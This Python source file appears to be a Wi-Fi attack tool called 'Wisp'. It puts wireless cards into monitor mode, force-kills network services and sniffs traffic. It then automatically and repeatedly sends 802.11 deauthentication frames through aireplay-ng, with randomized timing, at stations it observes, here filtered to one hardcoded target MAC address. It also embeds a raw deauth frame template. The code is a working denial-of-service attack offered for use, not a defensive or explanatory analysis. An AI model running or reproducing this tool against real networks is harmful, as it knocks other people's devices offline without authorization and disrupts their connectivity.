import shutil
import os
import json
from subprocess import call, run, check_output, Popen, DEVNULL, PIPE
import re
from multiprocessing import Process, Queue, Event
from time import time
from signal import signal, SIGKILL, SIGABRT, SIGINT
import sys
import queue
from secrets import randbelow

basepath = os.path.dirname(os.path.realpath(__file__))   
def _find_tools():
    sys_tools = [
        'iw',
        'ip',
        'rfkill',
        'aireplay-ng',
    ]
    project_tools = [
        'dream'
    ]
    tools = {
        **dict([ (t, shutil.which(t)) 
            for t in sys_tools ]),
        **dict([ (t, os.path.join(basepath, t)) 
            for t in project_tools ]),
    }
    for path in tools.values():
        assert os.path.isfile(path)
    return tools
tools : dict = _find_tools()

class Wisp:
    @staticmethod
    def from_config(path=None):
        name = 'wisp.json'
        defaults = (
            os.path.join(basepath, name),
            os.path.join('/etc', name),
        )
        path = path or next(p 
            for p in defaults 
            if os.path.isfile(p))
        assert path
        config = None
        with open(path, 'r') as file:
            config = json.load(file)
        assert config
        return Wisp(
            injector=Wisp.Monitor(config['injector'], 1),
            monitors=[ Wisp.Monitor(dev, **config['monitors'][dev])
                for dev in config['monitors'].keys() ],
            delay=config['timing']['delay'],
            jitter=config['timing']['jitter'],
            stale=config['timing']['stale'])

    @staticmethod
    def check_permissions():
        assert not os.geteuid()
        pass

    @staticmethod
    def _silent_call(name, *args):
        return call(
            [ name ] + [ str(arg) for arg in args],
            shell=False,
            stdout=DEVNULL,
            stderr=DEVNULL)

    @staticmethod
    def _call_tool(name, *args):
        assert name in tools.keys()
        return Wisp._silent_call(tools[name], *args)

    @staticmethod
    def _handle_rfkill(dev):
        assert dev
        path = f'/sys/class/net/{dev}/phy80211/'
        if not os.path.isdir(path):
            return
        index = int(next(node 
            for node in os.listdir(path) 
            if node.startswith('rfkill'))[len('rfkill'):])
        if Wisp._call_tool('rfkill', 'list', index):
            assert not Wisp._call_tool('rfkill', 'unblock', index)

    @staticmethod
    def _set_link(dev, state):
        e = Wisp._call_tool(
            'ip', 'link', 'set', 'dev', dev, state)
        print(dev, state, e)
        assert not e
        return

    class Monitor:
        @staticmethod
        def _get_phy(dev):
            output = None
            with open(f'/sys/class/net/{dev}/phy80211/name', 'r') \
                as file:
                output = file.read()
            assert output
            return output.strip()
        def _create_mon_name(self):
            return f'{self.phy}wisp'
        def _check_mon_type(self):
            typepath = \
                f'/sys/class/ieee80211/{self.phy}' \
                + f'/device/net/{self.mon}/type'
            assert os.path.isfile(typepath)
            with open(typepath, 'r') as file:
                linktype = int(file.read())
                assert linktype == 803
            return
        _channel_re : re.Pattern = re.compile(
            r'^\s*\*\s+(\d+)\s+MHz\s+\[(\d+)\]\s+.*$')
        def set_channel(self, channel, mon=None):
            assert not Wisp._call_tool('iw',
                'dev', mon if mon else self.mon,
                'set', 'freq', self.channel_map[int(channel)])
        # def _set_unregulated(self, domain='BO'):
        #     assert not Wisp._call_tool('iw',
        #         'dev', self.dev,
        #         'set', 'freq', self.channel_map[channel])
        def _dream_process(self, queue, assoc=False, dump=True):
            dream_re = re.compile(
                r'^(\d+),(\d+),([0-9A-Fa-f]{12}),([0-9A-Fa-f]{12}),$')
            cmd = [ tools['dream'] ] \
                + ([ '--a' ] if assoc else []) \
                + ([ '--d', f'{self.phy}-{int(time())}.cap' ] \
                    if dump else []) \
                + ([ '-tcbs' ]) \
                + ([ self.mon ])
            print(' '.join(cmd))
            dream = Popen(cmd, 
                bufsize=-1,
                stdin=DEVNULL,
                stdout=PIPE,
                stderr=DEVNULL,
                cwd=basepath,
                text=True)
            assert dream
            try:
                for line in iter(dream.stdout.readline,''):
                    line = line.rstrip()
                    match = dream_re.match(line)
                    if match:
                        queue.put_nowait(match.groups())
            except KeyboardInterrupt:
                pass
        def start(self):
            if self.mon:
                self._check_mon_type()
                return
            Wisp._set_link(self.dev, 'down')
            self.mon = self._create_mon_name()
            assert not Wisp._call_tool('iw', 
                'phy', self.phy, 
                'interface', 'add', self.mon,
                'type', 'monitor')
            assert not Wisp._call_tool('iw', 
                'dev', self.dev, 'del')
            Wisp._set_link(self.mon, 'up')
        def listen(self, queue):
            assert self.mon
            self.set_channel(self.channel)
            self.dream = Process(
                target=self._dream_process, 
                args=(queue,))
            self.dream.start()
        def stop(self):
            if self.dream:
                self.dream.terminate()
                while self.dream.is_alive():
                    pass
                self.dream.close()
                self.dream = None
            assert self.mon
            self._check_mon_type()
            assert not Wisp._call_tool('iw', 
                'dev', self.mon, 'del')
            self.mon = None
            assert not Wisp._call_tool('iw', 
                'phy', self.phy, 
                'interface', 'add', self.dev,
                'type', 'managed')

        def __init__(self, dev, channel):
            assert os.path.isdir(f'/sys/class/net/{dev}/phy80211')
            self.dev = dev
            self.channel = channel
            self.phy = self._get_phy(dev)
            self.info = check_output([ 'iw', 
                'phy', self.phy, 'info' ]).decode()
            self.channel_map = dict(
                (int(chan), int(freq))
                for chan, freq in [ 
                    match.groups()[::-1]
                    for match in [ 
                        self._channel_re.match(line) 
                        for line in self.info.splitlines() ] 
                    if match ])
            self.mon = None
            self.dream = None
            print(self.channel_map)

        def __eq__(self, other):
            if isinstance(other, Monitor):
                eq = self.phy == other.phy
                if eq:
                    assert self.dev == other.dev
                    assert self.channel == other.channel
                    assert self.mon == other.mon
            return NotImplemented
        def __hash__(self):
            return int.from_bytes(self.phy.encode(), 'little')

    interfering_processes = [
        'wpa_action', 
        'wpa_supplicant', 
        'wpa_cli', 
        'dhclient', 
        'ifplugd', 
        'dhcdbd', 
        'dhcpcd', 
        'udhcpc', 
        'NetworkManager', 
        'knetworkmanager', 
        'avahi-autoipd', 
        'avahi-daemon', 
        'wlassistant', 
        'wifibox',
    ]
    interfering_services = [
        'network-manager',
        'NetworkManager',
        'avahi-daemon',
    ]

    DEAUTH_REQ = \
        '\xC0\x00\x3A\x01' \
        '\xCC\xCC\xCC\xCC\xCC\xCC' \
        '\xBB\xBB\xBB\xBB\xBB\xBB' \
        '\xBB\xBB\xBB\xBB\xBB\xBB' \
        '\x00\x00\x07\x00'

    def _deauth(self, channel, bss, sta=None, count=4): 
        #assert 0
        assert self.injector.mon
        assert self.queue
        self.injector.set_channel(channel)
        def sep_mac(mac):
            if not isinstance(mac, bytes):
                assert len(mac) == 12
                mac = bytes.fromhex(mac)
            assert len(mac) == 6
            return ':'.join(f'{c:02x}' for c in mac)
        print(' '.join([ tools['aireplay-ng'], '-0' ]
            + [ str(count) ]
            + [ '-a', sep_mac(bss) ]
            + ([ '-c', sep_mac(sta) ] if sta else [])
            + [ self.injector.mon ]))
        aireplay = Popen([ tools['aireplay-ng'], '-0' ]
            + [ str(count) ]
            + [ '-a', sep_mac(bss) ]
            + ([ '-c', sep_mac(sta) ] if sta else [])
            + [ self.injector.mon ],
            stdin=DEVNULL,
            stdout=PIPE,
            stderr=DEVNULL,
            cwd=basepath,
            text=True)
        assert aireplay
        #for line in iter(aireplay.stdout.readline, ''):
            #print(line)
        
    def run(self):
        dev = list(self.monitors.keys())[0]
        self._handle_rfkill(dev)
        service_cmd = shutil.which('service')
        if service_cmd:
            for service in self.interfering_services:
                run([ service_cmd, service, 'stop' ],
                    shell=False,
                    stdout=DEVNULL,
                    stderr=DEVNULL)
        for process in self.interfering_processes:
            self._silent_call('kill', '-9', process)
        self.queue = Queue()
        for mon in self.monitors.values():
            mon.start()
            mon.listen(self.queue)
        self.injector.start()
        self.signal = Event()
        self.signal.clear()
        self.expiries = dict()
        try:
            def mstime():
                return int(time()*1000)
            while not self.signal.is_set():
                def is_stale(chan, bss, sta):
                    return (chan, bss, sta) in self.expiries \
                        and mstime() > self.expiries[chan,bss,sta] \
                            + self.stale \
                            - self.delay
                stale = [ e for e in self.expiries if is_stale(*e) ]
                for chan, bss, sta in stale:
                    #print('stale', chan, bss, sta)
                    del self.expiries[chan,bss,sta]
                ts = None
                chan = None
                bss = None
                sta = None
                try:
                    ts, chan, bss, sta = self.queue.get(True, 500)
                except queue.Empty:
                    continue
                except KeyboardInterrupt as e:
                    raise e
                if all(c == 'f' or c == '0' for c in bss):
                    continue
                if bss == sta:
                    continue
                ###########################
                if sta != '44850074234a':# f0ee10bf2db0':
                    continue
                ###########################
                def has_expired(chan, bss, sta):
                    return (chan, bss, sta) not in self.expiries \
                        or ((chan, bss, sta) in self.expiries \
                            and mstime() > self.expiries[chan,bss,sta])
                def set_expiry(chan, bss, sta):
                    self.expiries[chan,bss,sta] = mstime() \
                        + self.delay \
                        + (randbelow(self.jitter) - int(self.jitter/2))
                    #print('delayed', chan, bss, sta, self.expiries[chan,bss,sta])
                if has_expired(chan, bss, sta):
                    #print('expired', chan, bss, sta, mstime())
                    self._deauth(chan, bss, sta)
                    set_expiry(chan, bss, sta)
        except KeyboardInterrupt:
            pass
        finally:
            for mon in self.monitors.values():
                mon.stop()
            self.queue.close()
            self.injector.stop()

    def __init__(self, 
                 injector, monitors, 
                 delay=4000, jitter=1500, stale=300000):
        self.check_permissions()
        #self.tools : dict = self.find_tools()
        assert tools
        self.monitors = dict([ (m.dev, m) for m in monitors ])
        assert self.monitors
        for mon in self.monitors.values():
            assert not mon.mon
        self.injector = injector
        assert self.injector
        assert self.injector not in self.monitors
        self.delay = delay
        self.jitter = jitter
        self.stale = stale

def main():
    wisp = Wisp.from_config()
    wisp.run()
    print()
    return 0

if __name__ == '__main__':
    exit(main())
